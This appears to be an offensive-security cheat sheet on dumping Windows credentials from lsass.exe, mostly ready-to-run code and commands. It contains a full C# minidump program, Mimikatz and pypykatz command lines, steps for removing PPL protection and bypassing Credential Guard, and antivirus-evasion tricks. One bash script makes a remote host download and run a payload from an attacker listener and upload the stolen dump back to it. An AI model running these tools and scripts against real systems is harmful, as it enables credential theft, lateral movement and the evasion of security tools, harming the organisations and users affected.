---
description: Local Security Authority Subsystem Service
---

# lsass.exe

- [https://s3cur3th1ssh1t.github.io/Reflective-Dump-Tools/](https://s3cur3th1ssh1t.github.io/Reflective-Dump-Tools/)




## Enumeration

Check if lsass.exe is ran as a protected process (PPL):

```
PS > Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
```




## MiniDumpWriteDump



### Custom Implementations

- [https://github.com/rookuu/BOFs/tree/main/MiniDumpWriteDump](https://github.com/rookuu/BOFs/tree/main/MiniDumpWriteDump)
- [https://github.com/w1u0u1/minidump](https://github.com/w1u0u1/minidump)
- [https://github.com/helpsystems/nanodump/blob/main/source/nanodump.c](https://github.com/helpsystems/nanodump/blob/main/source/nanodump.c)



### MiniDump Callbacks

- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass#minidumpwritedump-to-memory-using-minidump-callbacks](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass#minidumpwritedump-to-memory-using-minidump-callbacks)
- [https://github.com/m0rv4i/SafetyDump/blob/master/SafetyDump/Program.cs](https://github.com/m0rv4i/SafetyDump/blob/master/SafetyDump/Program.cs)



### C\# Implementation

* [https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/MiniDump](https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/MiniDump)

{% code title="SharpMiniDump.cs" %}
```csharp
using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SharpMiniDump
{
    public class Program
    {
        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        public static void Main(string[] args)
        {
            FileStream dumpFile = new FileStream(@"C:\Windows\tasks\lsass.dmp", FileMode.Create);

            Process[] lsassProc = Process.GetProcessesByName("lsass");
            int lsassPid = lsassProc[0].Id;
            
            IntPtr hProcess = OpenProcess(
                0x001F0FFF, // PROCESS_ALL_ACCESS
                false,
                lsassPid);

            bool res = MiniDumpWriteDump(
                hProcess,
                lsassPid,
                dumpFile.SafeFileHandle.DangerousGetHandle(),
                2, // MiniDumpWithFullMemory
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero);
        }
    }
}
```
{% endcode %}




## Reusing Open Handles

- [https://rastamouse.me/duplicating-handles-in-csharp/](https://rastamouse.me/duplicating-handles-in-csharp/)
- [https://rastamouse.me/dumping-lsass-with-duplicated-handles/](https://rastamouse.me/dumping-lsass-with-duplicated-handles/)



### pypykatz

* [https://skelsec.medium.com/duping-av-with-handles-537ef985eb03](https://skelsec.medium.com/duping-av-with-handles-537ef985eb03)

```
Cmd > .\pypykatz.exe live lsa --method handledup
```



### SharpHandler

* [https://github.com/jfmaes/SharpHandler](https://github.com/jfmaes/SharpHandler)
* [https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpHandler.ps1](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpHandler.ps1)

Scan if there are dupeable handles to use:

```
PS > Invoke-SharpHandler -C "-s"
```

Write a gzip-compressed minidump to specified location:

```
PS > Invoke-SharpHandler -C "-w -c -l=C:\Windows\Temp\pony.dat"
```

Dump and parse with SharpKatz's `logonpasswords`:

```
PS > Invoke-SharpHandler -C "-d"
```



### HandleKatz

- [https://github.com/codewhitesec/HandleKatz](https://github.com/codewhitesec/HandleKatz)

```
$ x86_64-w64-mingw32-gcc -o loader.exe loader.cpp -lcrypt32
Cmd > .\loader.exe --pid:852 --outfile:C:\Windows\Temp\dump.obfuscated
```




## Silent Process Exit

* [https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/](https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/)
* [https://github.com/deepinstinct/LsassSilentProcessExit](https://github.com/deepinstinct/LsassSilentProcessExit)
* [https://github.com/lengjibo/RedTeamTools/tree/master/windows/LsassSilentProcessExit](https://github.com/lengjibo/RedTeamTools/tree/master/windows/LsassSilentProcessExit)
* [https://github.com/CompassSecurity/PowerLsassSilentProcessExit](https://github.com/CompassSecurity/PowerLsassSilentProcessExit)
* [https://gitlab.com/KevinJClark/csharptoolbox/-/blob/master/ShhProcessExit.cs](https://gitlab.com/KevinJClark/csharptoolbox/-/blob/master/ShhProcessExit.cs)




## Remove PPL Protection

- [https://github.com/itm4n/PPLdump](https://github.com/itm4n/PPLdump)
- [https://github.com/RedCursorSecurityConsulting/PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller)

Using Mimikatz driver:

```
PS > cmd /c sc create mimidrv binPath= C:\Windows\Tasks\mimidrv.sys type= kernel start= demand
PS > cmd /c sc start mimidrv
PS > Invoke-Mimikatz -Command '"!processprotect /process:lsass.exe /remove" "exit"'
```




## Load SSP

- [https://blog.xpnsec.com/exploring-mimikatz-part-2/](https://blog.xpnsec.com/exploring-mimikatz-part-2/)
- [https://www.programmersought.com/article/65604621980/](https://www.programmersought.com/article/65604621980/)
- [https://russianblogs.com/article/42611473286/](https://russianblogs.com/article/42611473286/)



### MirrorDump

- [https://github.com/CCob/MirrorDump](https://github.com/CCob/MirrorDump)
- [https://github.com/snovvcrash/MirrorDump](https://github.com/snovvcrash/MirrorDump)

```
Cmd > .\MirrorDump.exe -f "NotLSASS.zip" -d "LegitLSAPlugin.dll" -l 1073741824
Cmd > .\MirrorDump.exe --parse

$ python3 MirrorDump.py 0.0.0.0 31337 --md5 --parse
Cmd > .\MirrorDump.exe --host 10.10.13.37 --port 31337
```



### DuplicateDump

- [https://github.com/Hagrid29/DuplicateDump](https://github.com/Hagrid29/DuplicateDump)



### nanodump

- [https://www.coresecurity.com/core-labs/articles/nanodump-red-team-approach-minidumps](https://www.coresecurity.com/core-labs/articles/nanodump-red-team-approach-minidumps)
- [https://github.com/helpsystems/nanodump](https://github.com/helpsystems/nanodump)

```
Cmd > .\load_ssp.x64.exe C:\Windows\Temp\nanodump_ssp.x64.dll
beacon> load_ssp
```

Do it automatically with `wmiexec.py` magic (using [this](https://gist.github.com/mildred/67d22d7289ae8f16cae7) Python HTTP server with PUT support):

{% code title="nanodump_ssp.sh.cs" %}
```bash
#!/usr/bin/env bash

# Usage: sudo nanodump_ssp.sh <[DOMAIN\]USERNAME>:<PASSWORD> <TARGET> <LISTENER>
# Example: sudo nanodump_ssp.sh 'megacorp.local\snovvcrash:Passw0rd!' 192.168.1.11 10.10.13.37 80

CREDS=$1
RHOST=$2
LHOST=$3
LPORT=$4

CMD="IWR -Uri http://${LHOST}/a.exe -OutFile C:\Windows\Temp\a.exe;IWR -Uri http://${LHOST}/a.dll -OutFile C:\Windows\Temp\a.dll;C:\Windows\Temp\a.exe C:\Windows\Temp\a.dll"
CMD_BASE64=`echo -n ${CMD} | iconv -t UTF-16LE | base64 -w0`

python3 -m http.server ${LPORT} &

wmiexec.py -silentcommand -nooutput ${CREDS}@${RHOST} "powershell -enc ${CMD_BASE64}"
sleep 10

kill -9 `netstat -tulpan | grep ${LPORT} | grep python | awk '{ print $7 }' | awk -F/ '{ print $1 }'`
python3 put.py --bind=0.0.0.0 ${LPORT} &

CMD="IWR -Uri http://${LHOST}/out.bin -Method PUT -InFile C:\Windows\Temp\report.docx;rm C:\Windows\Temp\a.exe;rm C:\Windows\Temp\a.dll;rm C:\Windows\Temp\report.docx"
CMD_BASE64=`echo -n ${CMD} | iconv -t UTF-16LE | base64 -w0`

wmiexec.py -silentcommand -nooutput ${CREDS}@${RHOST} "powershell -enc ${CMD_BASE64}"
sleep 30

kill -9 `netstat -tulpan | grep ${LPORT} | grep python | awk '{ print $7 }' | awk -F/ '{ print $1 }'`

bash restore_signature.sh out.bin
pypykatz lsa minidump out.bin

chown ${SUDO_USER}:${SUDO_USER} out.bin
```
{% endcode %}




## Bypass Saving on Disk Detection

- [https://www.bussink.net/lsass-minidump-file-seen-as-malicious-by-mcafee-av/](https://www.bussink.net/lsass-minidump-file-seen-as-malicious-by-mcafee-av/)
- [https://github.com/k4nfr3/Dumpert](https://github.com/k4nfr3/Dumpert)




## NTFS Transactions



### TransactedSharpMiniDump

- [https://www.cybermongol.ca/operator-research/dump-lsass-with-sharpminidump-ntfs-transactions-uac-bypass-exfil-dmp-file-to-dropbox](https://www.cybermongol.ca/operator-research/dump-lsass-with-sharpminidump-ntfs-transactions-uac-bypass-exfil-dmp-file-to-dropbox)
- [https://github.com/PorLaCola25/TransactedSharpMiniDump](https://github.com/PorLaCola25/TransactedSharpMiniDump)



### CredBandit

- [https://www.cobaltstrike.com/blog/credbandit-a-review-of-a-tool-developed-built-by-the-cobalt-strike-user-community/](https://www.cobaltstrike.com/blog/credbandit-a-review-of-a-tool-developed-built-by-the-cobalt-strike-user-community/)
- [https://github.com/anthemtotheego/CredBandit](https://github.com/anthemtotheego/CredBandit)
- [https://github.com/xforcered/CredBandit](https://github.com/xforcered/CredBandit)
- [https://github.com/xenoscr/compressedCredBandit](https://github.com/xenoscr/compressedCredBandit)



### Dumpy

- [https://github.com/Kudaes/Dumpy/blob/341a7e47ab0e12ae3635cd0077fff1a172fef769/dumpy/dumper/src/lib.rs#L216-L429](https://github.com/Kudaes/Dumpy/blob/341a7e47ab0e12ae3635cd0077fff1a172fef769/dumpy/dumper/src/lib.rs#L216-L429)




## Kernel Mode

- [https://zerosum0x0.blogspot.com/2020/08/sassykitdi-kernel-mode-tcp-sockets.html](https://zerosum0x0.blogspot.com/2020/08/sassykitdi-kernel-mode-tcp-sockets.html)



### Abusing Gigabyte Driver

**CVE-2018-19320**

- [https://www.matteomalvica.com/blog/2020/07/15/silencing-the-edr/](https://www.matteomalvica.com/blog/2020/07/15/silencing-the-edr/)
- [https://www.secureauth.com/labs-old/gigabyte-drivers-elevation-of-privilege-vulnerabilities/](https://www.secureauth.com/labs-old/gigabyte-drivers-elevation-of-privilege-vulnerabilities/)
- [https://github.com/uf0o/windows-ps-callbacks-experiments/tree/master/evil-driver](https://github.com/uf0o/windows-ps-callbacks-experiments/tree/master/evil-driver)
- [https://github.com/fengjixuchui/gdrv-loader](https://github.com/fengjixuchui/gdrv-loader)
- [https://github.com/ASkyeye/CVE-2018-19320](https://github.com/ASkyeye/CVE-2018-19320)




## Physical Memory



### Physmem2profit

- [https://github.com/FSecureLABS/physmem2profit](https://github.com/FSecureLABS/physmem2profit)
- [https://github.com/Velocidex/WinPmem/releases/tag/v4.0.rc1](https://github.com/Velocidex/WinPmem/releases/tag/v4.0.rc1)

Server:

```
PS > .\Physmem2profit.exe --ip 192.168.1.11 --port 1337 --verbose [--hidden]
```

Client:

```
$ python3 physmem2profit --host 192.168.1.11 --port 1337 --install "C:/Windows/Temp/winpmem_x64.sys" --mode all --driver winpmem
```




## Credential Guard Bypass

Patch the `g_fParameter_UseLogonCredential` and `g_IsCredGuardEnabled` variables by their hardcoded offsets within `wdigest.dll` loaded by LSASS:

- [https://teamhydra.blog/2020/08/25/bypassing-credential-guard/](https://teamhydra.blog/2020/08/25/bypassing-credential-guard/)
- [https://gist.github.com/N4kedTurtle/8238f64d18932c7184faa2d0af2f1240](https://gist.github.com/N4kedTurtle/8238f64d18932c7184faa2d0af2f1240)

Resolve `g_fParameter_UseLogonCredential` and `g_IsCredGuardEnabled` variable offsets dynamically at runtime:

- [https://itm4n.github.io/credential-guard-bypass/](https://itm4n.github.io/credential-guard-bypass/)
- [https://github.com/itm4n/Pentest-Windows/blob/main/CredGuardBypassOffsets/poc.cpp](https://github.com/itm4n/Pentest-Windows/blob/main/CredGuardBypassOffsets/poc.cpp)

Merged 2 PoCs above:

- [https://gist.github.com/snovvcrash/43e976779efdd20df1596c6492198c99](https://gist.github.com/snovvcrash/43e976779efdd20df1596c6492198c99)




## Tools



### comsvcs.dll

* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz#comsvcs-dll](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz#comsvcs-dll)
* [https://github.com/Hackndo/lsassy/blob/master/lsassy/dumpmethod/comsvcs.py](https://github.com/Hackndo/lsassy/blob/master/lsassy/dumpmethod/comsvcs.py)
* [https://gist.github.com/JohnLaTwC/3e7dd4cd8520467df179e93fb44a434e](https://gist.github.com/JohnLaTwC/3e7dd4cd8520467df179e93fb44a434e)
* [https://sp00ks-git.github.io/posts/LSASS-Encrypted-Dump/](https://sp00ks-git.github.io/posts/LSASS-Encrypted-Dump/)

```
PS > $proc = 'ls'+'Ass'
PS > Get-Process $proc
PS > rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\System32\spool\drivers\color\pony.dat full
```

Not touching the disk (using an SMB share):

```
PS > net use z: \\10.10.13.37\share
PS > rundll32.exe c:\Windows\System32\comsvcs.dll, MiniDump (Get-Process ('ls'+'Ass')).id z:\pony.dat full
```

One-liner:

```
Cmd > %COMSPEC% /Q /c echo powershell.exe -NoP -C "%WINDIR%\System32\rundll32.exe %WINDIR%\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id %WINDIR%\Temp\pony.arj full;Wait-Process -Id (Get-Process rundll32).Id" 2^>^&1 > temp.bat & %COMSPEC% /Q /c temp.bat & del temp.bat
```



### ProcDump

- [https://docs.microsoft.com/en-us/sysinternals/downloads/procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
- [https://download.sysinternals.com/files/Procdump.zip](https://download.sysinternals.com/files/Procdump.zip)
- [https://live.sysinternals.com/](https://live.sysinternals.com/)

```
PS > .\procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp
```



### Mimikatz

- [https://github.com/gentilkiwi/mimikatz/releases](https://github.com/gentilkiwi/mimikatz/releases)
- [https://tools.thehacker.recipes/mimikatz](https://tools.thehacker.recipes/mimikatz)

```
PS > .\mimikatz.exe "privilege::debug" "token::elevate" "log out.txt" "sekurlsa::logonpasswords full" "exit"
```

{% hint style="warning" %}
In case of Windows 10 version 1803-1809 use [Mimikatz v2.1.1](https://github.com/gentilkiwi/mimikatz/files/4167347/mimikatz_trunk.zip), see [Key import error](https://github.com/gentilkiwi/mimikatz/issues/248)
{% endhint %}

Parse MiniDump:

```
PS > .\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords full" "exit"
```


#### kiwi

```
meterpreter > getsystem
meterpreter > load kiwi
meterpreter > creds_msv
meterpreter > creds_wdigest
meterpreter > lsa_dump_secrets
meterpreter > creds_all
meterpreter > kiwi_cmd '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords full" "exit"'
```



### pypykatz

- [https://github.com/skelsec/pypykatz/releases/latest](https://github.com/skelsec/pypykatz/releases/latest)

Parse MiniDump and grep for creds:

```
$ pypykatz lsa minidump lsass.dmp > out.txt

# Dumped with Mimikatz
$ grep -a '* Username : ' out.txt -A2 | grep -a -e Username -e Password -e NTLM | grep -a -v null | xclip -i -sel c

# Dumped with pypykatz
$ grep -a -P '\tusername ' out.txt -A2 | grep -a -e username -e password | grep -a -v None | xclip -i -sel c
$ grep -a -P 'Username: ' out.txt -A4 | grep -a -e Username -e Domain -e NT | grep -a -v None | xclip -i -sel c
```



### spraykatz

* [https://github.com/aas-n/spraykatz](https://github.com/aas-n/spraykatz)

```
$ python3 spraykatz.py -u snovvcrash -p 'Passw0rd!' -t 10.10.13.37,10.10.13.38,10.10.13.39
```



### Dumpert

* [https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/)
* [https://github.com/outflanknl/Dumpert](https://github.com/outflanknl/Dumpert)

Dump lsass.exe using direct syscalls and removing user-land API hooks:

```
Cmd > rundll32.exe .\Outflank-Dumpert-DLL.dll,Dump
```

Using [sRDI](https://www.netspi.com/blog/technical/adversary-simulation/srdi-shellcode-reflective-dll-injection/) (**s**hellcode **R**eflective **D**LL **I**njection) technique:

1. Compile [*Outflank-Dumpert-DLL.dll*](https://github.com/outflanknl/Dumpert/tree/master/Dumpert-DLL).
2. Convert it to position independent shellcode with [*ConvertToShellcode.py*](https://github.com/monoxgas/sRDI/blob/master/Python/ConvertToShellcode.py): `python3 ConvertToShellcode.py Outflank-Dumpert-DLL.dll`.
3. Use a shellcode loader of your choice to dump LSASS.



### lsassy

* [https://github.com/Hackndo/lsassy](https://github.com/Hackndo/lsassy)
* [https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/modules/lsassy.py](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/modules/lsassy.py)
* [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/)

```
$ lsassy 10.10.13.0/24 -d megacorp.local -u snovvcrash -p 'Passw0rd!'
$ cme smb 10.10.13.0/24 -u snovvcrash -p 'Passw0rd!' -M lsassy
```



### MalSeclogon

- [https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-2.html](https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-2.html)
- [https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-3.html](https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-3.html)
- [https://github.com/antonioCoco/MalSeclogon](https://github.com/antonioCoco/MalSeclogon)

```
Cmd > Malseclogon.exe -p <LSASS_PID> -d 1
Cmd > Malseclogon.exe -p <LSASS_PID> -d 2
```
